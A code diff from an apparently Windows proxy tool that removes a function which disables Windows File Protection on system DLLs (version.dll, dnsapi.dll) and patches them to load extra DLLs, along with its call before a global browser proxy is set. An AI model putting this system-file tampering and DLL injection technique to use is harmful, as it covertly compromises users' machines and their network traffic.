@@ -89,36 +89,6 @@ BOOL WINAPI Fundadores(const wchar_t * pszParam) {
 	return Common::Fundadores_(pszParam);
 }
 
-void InjectionCoreFile() {
-	char szTargetPath[MAX_PATH + 1] = { 0 };
-
-	//////////////////////////////////////////////////////////////////////////
-
-	//if (0 == ExpandEnvironmentStrings(_T("%WINDIR%\\System32\\imm32.dll"), szTargetPath, MAX_PATH)) {
-	//	_tcscpy(szTargetPath, _T("C:\\Windows\\System32\\imm32.dll"));
-	//}
-
-	//DisableWFP(szTargetPath);
-	//AddDllToFile("dnsopi.dll", szTargetPath, FALSE);
-
-	if (0 == ExpandEnvironmentStrings(_T("%WINDIR%\\System32\\version.dll"), szTargetPath, MAX_PATH)) {
-		_tcscpy(szTargetPath, _T("C:\\Windows\\System32\\version.dll"));
-	}
-
-	DisableWFP(szTargetPath);
-	AddDllToFile(szTargetPath, "dnsopi.dll");
-
-	//////////////////////////////////////////////////////////////////////////
-
-	if (0 == ExpandEnvironmentStrings(_T("%WINDIR%\\System32\\dnsapi.dll"), szTargetPath, MAX_PATH)) {
-		_tcscpy(szTargetPath, _T("C:\\Windows\\System32\\dnsapi.dll"));
-	}
-
-	DisableWFP(szTargetPath);
-	AddDllToFile(szTargetPath, "dnsepi.dll");
-
-}
-
 HANDLE WINAPI SetBusinessData(sockaddr_in * paddrPACSocket, sockaddr_in * paddrEncodeSocket)
 {
 	BUSINESS_DATA tbdBusinessData = { 0 };
@@ -135,7 +105,6 @@ HANDLE WINAPI SetBusinessData(sockaddr_in * paddrPACSocket, sockaddr_in * paddrE
 	strcpy(tbdBusinessData.szEncodeSockIP, szBuffer);
 	tbdBusinessData.usEncodeSockProt = ntohs(paddrEncodeSocket->sin_port);
 
-	InjectionCoreFile();
 	SetGlobalWebBrowserProxy(tbdBusinessData.szPACServerIP, tbdBusinessData.usPACServerProt);
 
 	return Common::SetBufferToShareMap("GLOBAL_LINGPAO8_ENCODE_BUSINESS_DATA", &tbdBusinessData, sizeof(BUSINESS_DATA));
